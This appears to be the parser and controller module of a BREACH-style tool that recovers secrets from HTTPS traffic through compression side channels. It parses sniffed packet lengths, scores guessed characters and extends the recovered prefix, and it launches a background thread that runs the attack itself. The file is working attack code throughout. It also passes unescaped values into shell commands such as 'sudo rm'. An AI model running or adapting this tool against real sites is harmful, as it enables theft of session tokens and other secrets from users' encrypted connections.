from __future__ import division
from os import system, path, getpid
import sys
import signal
import datetime
import logging
import time
import threading
import constants
import connect
from user_input import get_arguments_dict

def signal_handler(signal, frame):
    '''
    Signal handler for killing the execution.
    '''
    print('Exiting the program per your command')
    system('rm -f out.out request.txt user_input.pyc hillclimbing.pyc constants.pyc connect.pyc')
    system('mv basic_breach.log full_breach.log debug.log attack.log ' + parser.history_folder)
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

class Parser():
    '''
    Class that parses the packet lengths that are sniffed through the network.
    '''
    def __init__(self, args_dict):
        '''
        Initialize constants and arguments.
        '''
        self.args_dict = args_dict
        assert args_dict['pivot_length'] or args_dict['minimum_request_length'], 'Invalid combination of minimum request and pivot lengths'
        self.alpha_types = args_dict['alpha_types']
        if 'alphabet' in args_dict:
            self.alphabet = args_dict['alphabet']
        self.pivot_length = args_dict['pivot_length']
        self.prefix = args_dict['prefix']
        self.latest_file = args_dict['latest_file']
        self.minimum_request_length = args_dict['minimum_request_length']
        self.method = args_dict['method']
        self.correct_val = args_dict['correct_val']
        self.sampling_ratio = args_dict['sampling_ratio']
        self.refresh_time = args_dict['refresh_time']
        self.start_time = args_dict['start_time']
        self.verbose = args_dict['verbose']
        self.max_iter = args_dict['iterations']
        self.wdir = args_dict['wdir']
        self.execute_breach = args_dict['execute_breach']
        self.divide_and_conquer = args_dict['divide_and_conquer'] if 'divide_and_conquer' in args_dict else 0
        self.history_folder = args_dict['history_folder'] if 'history_folder' in args_dict else 'history/'
        self.latest_file = 0
        self.point_system = constants.POINT_SYSTEM_MAPPING[args_dict['method']]
        if 'attack_logger' in args_dict:
            if self.verbose < 1:
                self.setup_logger('attack_logger', 'attack.log', logging.ERROR)
            else:
                self.setup_logger('attack_logger', 'attack.log')
        if not 'debug_logger' in args_dict:
            if self.verbose < 2:
                self.setup_logger('debug_logger', 'debug.log', logging.ERROR)
            else:
                self.setup_logger('debug_logger', 'debug.log')
        self.debug_logger = logging.getLogger('debug_logger')
        self.args_dict['debug_logger'] = self.debug_logger
        self.attack_logger = logging.getLogger('attack_logger')
        self.args_dict['attack_logger'] = self.attack_logger
        system('mkdir ' + self.history_folder)
        return

    def setup_logger(self, logger_name, log_file, level=logging.DEBUG):
        '''
        Logger factory.
        '''
        l = logging.getLogger(logger_name)
        l.setLevel(level)
        formatter = logging.Formatter('%(asctime)s : %(message)s')
        fileHandler = logging.FileHandler(log_file)
        fileHandler.setFormatter(formatter)
        l.addHandler(fileHandler)
        if self.args_dict['log_to_screen']:
            streamHandler = logging.StreamHandler()
            streamHandler.setFormatter(formatter)
            l.addHandler(streamHandler)
        return

    def create_dictionary_sample(self, output_dict, iter_dict):
        '''
        Create a dictionary of the sampled input.
        '''
        combined = {}
        for k, v in iter_dict.items():
            if v != 0:
                combined[k] = output_dict[k] / iter_dict[k]
        return combined

    def sort_dictionary_values(self, dictionary, desc = False):
        '''
        Sort a dictionary by values.
        '''
        sorted_dict = [ (v,k) for k, v in dictionary.items() ]
        sorted_dict.sort(reverse=desc)
        return sorted_dict

    def sort_dictionary(self, dictionary, desc = False):
        '''
        Sort a dictionary by keys.
        '''
        sorted_dict = [ (v,k) for v, k in dictionary.items() ]
        sorted_dict.sort(reverse=desc)
        return sorted_dict

    def get_alphabet(self, request_args):
        '''
        Get the alphabet of the search strings.
        '''
        import hillclimbing

        return hillclimbing.create_request_file(request_args)

    def continue_parallel_division(self, correct_alphabet):
        '''
        Continue parallel execution with the correct half of the previous alphabet.
        '''
        return self.get_alphabet({'alphabet': correct_alphabet, 'prefix': self.prefix, 'method': self.method})

    def get_aggregated_input(self):
        '''
        Iterate over input files and get aggregated input.
        '''
        with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
            result_file.write('Combined output files\n\n')
        system('cp out.out ' + self.history_folder + self.filename + '/out_' + self.filename + '_' + str(self.latest_file))
        out_iterator = '0'
        total_requests = 0
        aggregated = []
        while int(out_iterator) < 10000000:
            try:
                output_file = open(self.history_folder + self.filename + '/out_' + self.filename + '_' + out_iterator, 'r')
                with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                    result_file.write('out_' + self.filename + '_' + out_iterator + '\n')

                prev_request = 0
                curr_request = 0
                buff = []
                request_buff = []
                found_first_req = False
                found_response_packet = False
                grab_next = False
                response_length = 0
                in_bracket = True
                after_start = False
                illegal_iteration = False
                illegal_next_response = False
                for line in output_file.readlines():
                    if prev_request and prev_request % len(self.alphabet) == 0:
                        if illegal_iteration:
                            self.debug_logger.debug('Found illegal iteration %f' % float(total_requests/len(self.alphabet)))
                            illegal_iteration = False
                        else:
                            for r in buff:
                                aggregated.append(r)
                                total_requests = total_requests + 1
                        buff = []
                    if line.find(':') < 0:
                        continue
                    pref, size = line.split(': ')
                    if self.minimum_request_length:
                        if not after_start:
                            if pref == 'User application payload' and int(size) > 1000:
                                after_start = True
                                in_bracket = False
                            continue
                        else:
                            if pref == 'User application payload' and int(size) > self.minimum_request_length:
                                if in_bracket:
                                    if response_length == 0:
                                        buff.append('%d: %d' % (prev_request, response_length))
                                        illegal_iteration = True
                                        illegal_next_response = True
                                    else:
                                        if illegal_next_response:
                                            buff.append('%d: 0' % prev_request)
                                            illegal_iteration = True
                                            illegal_next_response = False
                                        else:
                                            buff.append('%d: %d' % (prev_request, response_length))
                                            response_length = 0
                                    prev_request = prev_request + 1
                                in_bracket = not in_bracket
                            if pref == 'Endpoint application payload' and in_bracket:
                                response_length = response_length + int(size)
                    else:
                        if (pref == 'Endpoint application payload'):
                            if grab_next:
                                grab_next = False
                                summary = int(size) + prev_size
                                buff.append('%d: %d' % (prev_request, summary))
                                prev_request = prev_request + 1
                            if int(size) > self.pivot_length - 10 and int(size) < self.pivot_length + 10:
                                grab_next = True
                                continue
                            prev_size = int(size)

                output_file.close()
                out_iterator = str(int(out_iterator) + 1)
                aggregated.append('-1: -2')
            except IOError:
                break
        return aggregated

    def calculate_output(self, aggregated_input):
        '''
        Calculate output from aggregated input.
        '''
        samples = {}
        iterations = {}
        output_sum = {}
        for i in self.alphabet:
            iterations[i] = 0
            output_sum[i] = 0
        alpha_counter = 0
        for parsed_line in aggregated_input:
            it, size = parsed_line.split(': ')
            if int(size) == -2:
                alpha_counter = 0
                continue
            if int(size) > 0:
                output_sum[self.alphabet[alpha_counter]] = output_sum[self.alphabet[alpha_counter]] + int(size)
                iterations[self.alphabet[alpha_counter]] = iterations[self.alphabet[alpha_counter]] + 1
            alpha_counter = alpha_counter + 1
            if alpha_counter > len(self.alphabet) - 1:
                alpha_counter = 0
                sample = self.create_dictionary_sample(output_sum, iterations)
                sorted_sample = self.sort_dictionary_values(sample)
                samples[iterations[self.alphabet[alpha_counter]]] = sorted_sample
        return output_sum, iterations, samples

    def log_with_correct_value(self, samples, iterations):
        '''
        Write parsed output to result file when knowing the correct value.
        '''
        points = {}
        for i in self.alphabet:
            points[i] = 0
        with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
            result_file.write('\n')
            result_file.write('Correct value = %s\n\n\n' % self.correct_val)
            result_file.write('Iteration - Length Chart - Divergence from top - Points Chart - Points\n\n')
        found_in_iter = False
        correct_leader = False
        for sample in samples:
            pos = 1
            for j in sample[1]:
                if correct_leader:
                    divergence = j[0] - correct_len
                    correct_leader = False
                alphabet = j[1].split(self.prefix)
                alphabet.pop(0)
                for i in enumerate(alphabet):
                    alphabet[i[0]] = i[1].split()[0]
                found_correct = (j[1] == self.correct_val) if self.method == 's' else (self.correct_val in alphabet)
                if found_correct:
                    correct_pos = pos
                    correct_len = j[0]
                    if pos == 1:
                        correct_leader = True
                    else:
                        divergence = leader_len - j[0]
                    found_in_iter = True
                else:
                    if pos == 1:
                        leader_len = j[0]
                if pos in self.point_system:
                    if iterations[self.alphabet[0]] > self.max_iter/2:
                        points[j[1]] = points[j[1]] + 2 * self.point_system[pos]
                    else:
                        points[j[1]] = points[j[1]] + self.point_system[pos]
                pos = pos + 1
            if sample[0] % self.sampling_ratio == 0 or sample[0] > len(samples) - 10:
                if not found_in_iter:
                    with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                        result_file.write('%d\t%d\t%d\t%d\t%d\n' % (0, 0, 0, 0, 0))
                else:
                    points_chart = self.sort_dictionary_values(points, True)
                    for position in enumerate(points_chart):
                        if position[1][1] == self.correct_val:
                            correct_position_chart = position[0] + 1
                            if position[0] == 0:
                                diff = position[1][0] - points_chart[1][0]
                            else:
                                diff = position[1][0] - points_chart[0][0]
                    with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                        result_file.write('%d\t\t%d\t\t%f\t\t%d\t%d\n' % (sample[0], correct_pos, divergence, correct_position_chart, diff))
        with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
            result_file.write('\n')
        return points

    def log_without_correct_value(self, samples, iterations, combined_sorted):
        '''
        Write parsed output to result file without knowing the correct value.
        '''
        points = {}
        for i in self.alphabet:
            points[i] = 0
        for sample in samples:
            for j in enumerate(sample[1]):
                if j[0] in self.point_system and sample[1][0]:
                    if sample[0] > self.max_iter/2:
                        points[j[1][1]] = points[j[1][1]] + (2 * self.point_system[j[0]])
                    else:
                        points[j[1][1]] = points[j[1][1]] + self.point_system[j[0]]
        with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
            result_file.write('\n')
            result_file.write('Iteration %d\n\n' % iterations[self.alphabet[0]])
        if self.method == 's' and combined_sorted:
            with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                result_file.write('Correct Value is \'%s\' with divergence %f from second best.\n' % (combined_sorted[0][1], combined_sorted[1][0] - combined_sorted[0][0]))
        return points

    def log_result_serial(self, combined_sorted, points):
        '''
        Log points info to result file for serial method of execution.
        '''
        for symbol in enumerate(combined_sorted):
            if symbol[0] % 6 == 0:
                with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                    result_file.write('\n')
            with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                result_file.write('%s %f\t' % (symbol[1][1], symbol[1][0]))
        with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
            result_file.write('\n')
        points_chart = self.sort_dictionary_values(points, True)
        for symbol in enumerate(points_chart):
            if symbol[0] % 10 == 0:
                with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                    result_file.write('\n')
            with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                result_file.write('%s %d\t' % (symbol[1][1], symbol[1][0]))
        with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
            result_file.write('\n\n')
        return points_chart[0][1]

    def log_result_parallel(self, combined_sorted, points):
        '''
        Log points info to result file for parallel method of execution.
        '''
        correct_alphabet = None
        for symbol in enumerate(combined_sorted):
            if symbol[0] == 0: # TODO: Better calculation of correct alphabet
                correct_alphabet = symbol[1][1].split(self.prefix)
                correct_alphabet.pop(0)
                for i in enumerate(correct_alphabet):
                    correct_alphabet[i[0]] = i[1].split()[0]
            with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                result_file.write('%s \nLength: %f\nPoints: %d\n\n' % (symbol[1][1], symbol[1][0], points[symbol[1][1]]))
        return correct_alphabet

    def attack_forward(self, correct_alphabet, points):
        '''
        Continue the attack properly, after checkpoint was reached.
        '''
        if len(correct_alphabet) == 1:
            self.args_dict['prefix'] = self.prefix + points[0][1].split()[0]
            self.args_dict['divide_and_conquer'] = 0
            self.args_dict['alphabet']= self.get_alphabet({'alpha_types': self.alpha_types, 'prefix': self.prefix, 'method': self.method})
            self.attack_logger.debug('SUCCESS: %s\n' % correct_alphabet[0])
            self.attack_logger.debug('Total time till now: %s\n' % str(datetime.datetime.now() - self.start_time))
            self.attack_logger.debug('----------Continuing----------\n')
            self.attack_logger.debug('Alphabet: %s\n' % str(self.alphabet))
            self.continue_attack = True
        else:
            self.args_dict['divide_and_conquer'] = self.divide_and_conquer + 1
            correct_alphabet = points[0][1].split(self.prefix)
            correct_alphabet.pop(0)
            for i in enumerate(correct_alphabet):
                correct_alphabet[i[0]] = i[1].split()[0]
            self.args_dict['alphabet'] = self.continue_parallel_division(correct_alphabet)
            self.continue_next_hop = True
            self.attack_logger.debug('Correct Alphabet: %d Incorrect Alphabet: %d' % (points[0][0], points[1][0]))
            self.attack_logger.debug('Alphabet: %s\n' % str(self.alphabet))
        self.args_dict['latest_file'] = 0
        return

    def prepare_parsing(self):
        '''
        Prepare environment for parsing.
        '''
        system('sudo rm ' + self.wdir + 'request.txt')
        time.sleep(5)
        system('rm -f out.out')
        if not self.divide_and_conquer:
            self.alphabet = self.get_alphabet({'alpha_types': self.alpha_types, 'prefix': self.prefix, 'method': self.method})
            self.args_dict['alphabet'] = self.alphabet
        system('cp request.txt ' + self.wdir)

        if self.execute_breach:
            if 'connector' not in self.args_dict or not self.args_dict['connector'].isAlive():
                self.debug_logger.debug('Is connector in args_dict? %s\n' % str('connector' in self.args_dict))
                if 'connector' in self.args_dict:
                    self.debug_logger.debug('Is connector alive? %s\n' % str(self.args_dict['connector'].isAlive()))
                self.connector = ConnectorThread(self.args_dict)
                self.connector.start()
                self.args_dict['connector'] = self.connector
            else:
                self.connector = self.args_dict['connector']

        self.filename = '_'.join(self.alpha_types) + '_' + self.prefix + '_' + str(self.divide_and_conquer)
        system('mkdir ' + self.history_folder + self.filename)
        system('cp request.txt ' + self.history_folder + self.filename + '/request_' + self.filename)
        if self.method == 'p' and self.correct_val:
            if self.correct_val in self.alphabet[0]:
                self.correct_val = self.alphabet[0]
            elif self.correct_val in self.alphabet[1]:
                self.correct_val = self.alphabet[1]
            else:
                self.correct_val = None
        self.checkpoint = self.max_iter
        self.continue_next_hop = False
        self.continue_attack = False
        while path.isfile(self.history_folder + self.filename + '/out_' + self.filename + '_' + str(self.latest_file)):
            self.latest_file = self.latest_file + 1
        return

    def parse_input(self):
        '''
        Execute loop to parse output in real time.
        '''
        self.prepare_parsing()
        self.debug_logger.debug('Starting loop with args_dict: %s\n' % str(self.args_dict))
        while self.connector.isAlive() if self.execute_breach else True:
            points = {}
            for i in self.alphabet:
                points[i] = 0
            system('rm ' + self.history_folder + self.filename + '/result_' + self.filename)

            aggregated_input = self.get_aggregated_input()
            output_sum, iterations, samples = self.calculate_output(aggregated_input)
            combined = self.create_dictionary_sample(output_sum, iterations)
            combined_sorted = self.sort_dictionary_values(combined)
            samples[iterations[self.alphabet[0]]] = combined_sorted
            samples = self.sort_dictionary(samples)
            points = self.log_with_correct_value(samples, iterations) if self.correct_val else self.log_without_correct_value(samples, iterations, combined_sorted)
            if self.method == 's':
                correct_alphabet = self.log_result_serial(combined_sorted, points)
            elif self.method == 'p':
                correct_alphabet = self.log_result_parallel(combined_sorted, points)

            system('cat ' + self.history_folder + self.filename + '/result_' + self.filename)
            points = self.sort_dictionary_values(points, True)
            if (self.method == 'p' and points[0][0] > self.checkpoint/2) or (self.method == 's' and points[0][0] > self.checkpoint*10):
                self.attack_forward(correct_alphabet, points)
                break
            time.sleep(self.refresh_time)
        if self.execute_breach:
            if not self.continue_next_hop and not self.continue_attack:
                self.connector.join()
                self.args_dict['latest_file'] = self.latest_file + 1
        return self.args_dict

class ConnectorThread(threading.Thread):
    '''
    Thread to run breach.py on the background.
    '''
    def __init__(self, args_dict):
        super(ConnectorThread, self).__init__()
        self.args_dict = args_dict
        self.daemon = True
        self.args_dict['debug_logger'].debug('Initialized breach thread\n')

    def run(self):
        self.connector = connect.Connector(self.args_dict)
        self.args_dict['debug_logger'].debug('Created breach object\n')
        self.connector.execute_breach()
        self.args_dict['debug_logger'].debug('Breach has stopped executing\n')
        return

if __name__ == '__main__':
    args_dict = get_arguments_dict(sys.argv)
    args_dict['start_time'] = datetime.datetime.now()
    while 1:
        parser = Parser(args_dict)
        args_dict = parser.parse_input()
